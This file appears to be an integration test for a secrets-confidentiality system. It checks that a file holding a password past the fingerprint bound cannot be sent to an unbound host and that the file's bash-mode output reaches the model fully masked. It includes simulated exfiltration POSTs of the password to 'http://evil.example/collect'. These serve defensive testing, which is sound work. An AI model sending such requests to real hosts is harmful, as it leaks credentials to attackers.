/**
 * large-file-egress-prompt — plan 10 §11.18, the outbound check and the
 * prompt filter past the piece bound, over the REAL components: a real
 * ArbiterServer in `secrets`, the real net-proxy (its production adapter
 * over a data and a human client; the attribution injected, no /proc, as in
 * its own parity test) and the anthropic-proxy's rewrite over its
 * production adapter.
 *
 * A labelled file of 17 MiB (over the 16 Mi-character bound: the arbiter
 * never reads it, so neither the outbound tripwire nor the prompt filter
 * knows any piece of it) is read raw by its listed reader. Where its bytes
 * can go:
 *
 *   - OUT: the reader, a holder, is refused at a host the file is not bound
 *     to by the taint gate (plan 13 D6), which needs no piece: the tripwire,
 *     asked about the same body, does not trip. At the file's bound host the
 *     send is a release (the tripwire stands down there for every file). A
 *     sender the proxy cannot attribute is refused while the session holds
 *     the file. So the tripwire's blind spot past the bound is no hole.
 *   - IN, by the prompt: the program output that reaches a user turn
 *     (Claude Code's `!cmd` bash mode) is read as a shell result, so the
 *     reader's output is masked whole like a tool result (callTaint), with
 *     no piece needed.
 *
 * Unit twins: arbiter `read-file-registration.test.ts` (callTaint past the
 * bound), anthropic-proxy `claude-bashmode.test.ts`.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";
import { closeSync, ftruncateSync, mkdirSync, mkdtempSync, openSync, rmSync, writeSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy, type HttpForwarder } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetProxyAdapter, type RealArbiterClient as NetProxyRealClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import type { ProcHolder } from "../../interceptors/net-proxy/src/conn-attr.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { rewriteRequest } from "../../interceptors/anthropic-proxy/src/rewrite-request.js";
import type { MessagesRequest } from "../../interceptors/anthropic-proxy/src/messages-types.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

const READER = "/usr/bin/ssh-add";
const H = "c".repeat(64);
const PAST_BOUND = "Vx5nQ8rT2mKw"; // 12 characters, a token past the bound
const SESSION = "s-large-egress-prompt";

function post(port: number, url: string, body: string): Promise<number> {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const r = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => { res.resume(); res.on("end", () => resolve(res.statusCode ?? 0)); },
    );
    r.on("error", reject);
    r.end(body);
  });
}

test("a file over the piece bound, read raw: its holder cannot send a piece past the bound to an unbound host (the tripwire alone would not trip), and its bash-mode output reaches the model masked whole (secrets axes, explicit)", async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-large-egress-prompt-"));
  const dump = join(tmp, "archive.dump");
  const fd = openSync(dump, "w");
  writeSync(fd, "header\n");
  ftruncateSync(fd, 17 * 1024 * 1024 - 64);
  closeSync(fd);
  const tail = openSync(dump, "a");
  writeSync(tail, `\npassword ${PAST_BOUND}\n`); // past the 16 Mi-character bound
  closeSync(tail);
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = join(tmp, "human", "h.sock");
  mkdirSync(join(tmp, "human"), { mode: 0o700 });
  const server = new ArbiterServer({
    socketPath, humanSocketPath: humanPath, dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false,
    policyDocument: { version: 1, paths: [{ path: dump, level: "no-model", bindings: ["vault.corp"], readers: [{ app: "ssh-add", output: "clear" }] }] } as never,
  });
  await server.listen();
  const guard = new ArbiterClient(humanPath); await guard.connect();
  const proxyHuman = new ArbiterClient(humanPath); await proxyHuman.connect();
  const proxyData: RealArbiterClient = new ArbiterClient(socketPath); await (proxyData as unknown as ArbiterClient).connect();
  const netData = new ArbiterClient(socketPath); await netData.connect();
  const netHuman = new ArbiterClient(humanPath); await netHuman.connect();
  const reached: string[] = [];
  const forwarder: HttpForwarder = async (req) => {
    reached.push(`${req.url} ${req.body?.toString("utf8") ?? ""}`);
    return { status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") };
  };
  let holders: ProcHolder[] = [];
  const net = new NetProxy({
    arbiter: new NetProxyAdapter(netData as unknown as NetProxyRealClient, netHuman as never), forwarder, log: () => {}, sessionId: SESSION,
    attributeHolders: () => holders,
  });
  const netPort = await net.listen(0);
  try {
    // The reader, under the agent's shell for a bash-mode command, reads the file raw.
    const cmd = "db-report --archive";
    await guard.recordExecRoot({ procKey: "lep-sh", ancestors: ["agent-0"], argv: ["/bin/bash", "-c", cmd], session: SESSION, callRoot: true });
    await guard.recordExecRoot({ procKey: "lep-r", parentKey: "lep-sh", argv: [READER, "--archive"], session: SESSION });
    const d = await guard.decideSecretOpen({ path: dump, exe: READER, sha256: H, isAgent: false, procKey: "lep-r", parentKey: "lep-sh", ancestorKeys: ["lep-sh", "agent-0"], exeSystem: true, openerEnv: [], session: SESSION });
    assert.equal(d.verdict, "raw", d.reason);

    // OUT. The tripwire knows no piece of the file (over the bound) ...
    const body = `password ${PAST_BOUND}`;
    const trip = await guard.egressFingerprintScan({ surfaces: [{ where: "body", text: body }], destination: "evil.example" });
    assert.equal(trip.tripped, false, "the tripwire alone would let a piece past the bound through");
    // ... and the holder is refused anyway: the taint gate needs no piece.
    holders = [{ procKey: "lep-r", ancestors: ["lep-sh", "agent-0"] }];
    assert.equal(await post(netPort, "http://evil.example/collect", body), 403, "a holder at a host the file is not bound to");
    assert.deepEqual(reached, [], "nothing reached the unbound host");
    // a sender the proxy cannot attribute, while the session holds the file
    holders = [];
    assert.equal(await post(netPort, "http://evil.example/collect", body), 403, "an unattributed sender");
    assert.deepEqual(reached, []);
    // control: the holder at the file's bound host is a release
    holders = [{ procKey: "lep-r", ancestors: ["lep-sh", "agent-0"] }];
    assert.equal(await post(netPort, "http://vault.corp/upload", body), 200, "the bound host");
    assert.equal(reached.length, 1);

    // IN, by the prompt: Claude Code's bash mode, the reader's output as a user turn.
    const out = `rows\n77\n${body}\n`;
    const r = await rewriteRequest({
      model: "claude-test", tools: [{ name: "Bash" }],
      messages: [
        { role: "user", content: [{ type: "text", text: `<bash-input>${cmd}</bash-input>\n` }, { type: "text", text: `<bash-stdout>${out}</bash-stdout><bash-stderr></bash-stderr>` }] },
      ],
    } as MessagesRequest, { arbiter: new ArbiterClientAdapter(proxyData, proxyHuman as never), sessionKey: SESSION });
    const sent = JSON.stringify(r.request);
    assert.ok(!sent.includes(PAST_BOUND), `CONFIDENTIALITY VIOLATION: a piece past the bound reached the model through bash mode: ${sent}`);
    assert.ok(!sent.includes("rows\\n77"), `the reader's output is masked whole (its output rule releases nothing past the bound): ${sent}`);
    assert.match(sent, /\$MDU:nomodel_Bash\[/);
  } finally {
    await net.close();
    guard.close(); proxyHuman.close(); (proxyData as unknown as ArbiterClient).close(); netData.close(); netHuman.close();
    await server.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
